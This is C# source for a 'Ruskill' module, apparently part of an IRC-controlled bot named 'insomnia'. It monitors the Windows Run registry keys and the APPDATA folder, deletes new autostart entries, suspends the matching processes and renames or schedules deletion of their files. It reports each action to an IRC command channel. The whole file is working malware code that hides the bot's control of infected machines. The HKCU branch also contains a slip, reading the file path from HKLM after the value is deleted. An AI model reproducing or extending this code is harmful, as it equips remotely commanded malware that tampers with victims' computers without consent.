using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace insomnia
{
    internal class Ruskill
    {
        private static List<string> _registryKeys;
        private static List<string> _droppedFiles = new List<string>();
        public static bool enabled = false;
        private static FileSystemWatcher _watchFolder = new FileSystemWatcher();

        public static void StartRuskill()
        {
            try
            {
                enabled = true;
                _registryKeys = BuildRegistrySnapshot(); // Take a snapshot of current changes

                // Start FileWatcher
                _watchFolder.Path = Environment.GetEnvironmentVariable("APPDATA");
                _watchFolder.NotifyFilter = System.IO.NotifyFilters.DirectoryName;
                _watchFolder.NotifyFilter = _watchFolder.NotifyFilter | System.IO.NotifyFilters.FileName;
                _watchFolder.NotifyFilter = _watchFolder.NotifyFilter | System.IO.NotifyFilters.Attributes;
                _watchFolder.Created += new FileSystemEventHandler(eventRaised);


                _watchFolder.EnableRaisingEvents = true;
            }
            catch
            {
            }

            while (enabled)
            {
                try
                {
                    // Cycle through reg keys and see if anythings new
                    foreach (string rk in Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false).GetValueNames())
                    {
                        if (!_registryKeys.Contains(rk))
                        {
                            IRC.WriteMessage("Found new registry key in HKCU:" + IRC.ColorCode(" " + rk) + ".", Config._rkChan());
                            try
                            {
                                Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue(rk);
                                IRC.WriteMessage("Registry key removed:" + IRC.ColorCode(" " + rk) + ".", Config._rkChan());
                                RuskillRemove(Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false).GetValue(rk).ToString());
                            }
                            catch
                            {
                            }
                            _registryKeys.Add(rk);
                        }
                    }

                    foreach (string rk in Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false).GetValueNames())
                    {
                        if (!_registryKeys.Contains(rk))
                        {
                            IRC.WriteMessage("Found new registry key in HKLM:" + IRC.ColorCode(" " + rk) + ".", Config._rkChan());
                            try
                            {
                                Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue(rk);
                                IRC.WriteMessage("Registry key removed:" + IRC.ColorCode(" " + rk) + ".", Config._rkChan());
                                RuskillRemove(Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false).GetValue(rk).ToString());
                            }
                            catch
                            {
                            }
                            _registryKeys.Add(rk);
                        }
                    }
                }
                catch
                {
                }
                Thread.Sleep(3000);
            }
        }

        public static void RuskillRemove(string path)
        {
            IRC.WriteMessage("New drop:" + IRC.ColorCode(" " + path) + ".", Config._rkChan());

            if (File.Exists(path))
            {
                if (!_droppedFiles.Contains(path))
                {
                    if (Win32.ScheduleForDeletion(path))
                    {
                        IRC.WriteMessage("File was successfully scheduled for deletion upon next reboot:" + IRC.ColorCode(" " + path) + ".", Config._rkChan());
                    }
                    else
                    {
                        string dest = Path.GetFullPath(path) + "_" + Functions.RandomString(5);
                        try
                        {
                            string pName = Path.GetFileNameWithoutExtension(dest); // Find the running process and suspend it, then rename the file.
                            Functions.SuspendProcess(Process.GetProcessesByName(pName)[0].Id);
                        }
                        catch
                        {
                        }  
                        if (Win32.RenameFile(path, dest))
                            IRC.WriteMessage("File was renamed to break startup:" + IRC.ColorCode(" " + path) + " ->" + IRC.ColorCode(" " + dest) + ".", Config._rkChan());
                    }
                }
                _droppedFiles.Add(path);
            }
        }
        public static void eventRaised(object sender, System.IO.FileSystemEventArgs e)
        {
            if (enabled)
            {
                switch (e.ChangeType)
                {
                    case WatcherChangeTypes.Created:
                        Thread.Sleep(2000);
                        RuskillRemove(e.FullPath);
                        break;
                }
            }
        }

        public static void StopRuskill()
        {
            enabled = false;
            // Stop FileWatcher
        }
        private static List<string> BuildRegistrySnapshot()
        {
            List<string> temp = new List<string>();

            foreach (string rk in Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false).GetValueNames())
            {
                if (!temp.Contains(rk))
                    temp.Add(rk);
            }

            foreach (string rk in Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", false).GetValueNames())
            {
                if (!temp.Contains(rk))
                    temp.Add(rk);
            }

            return temp;
        }
    }
}
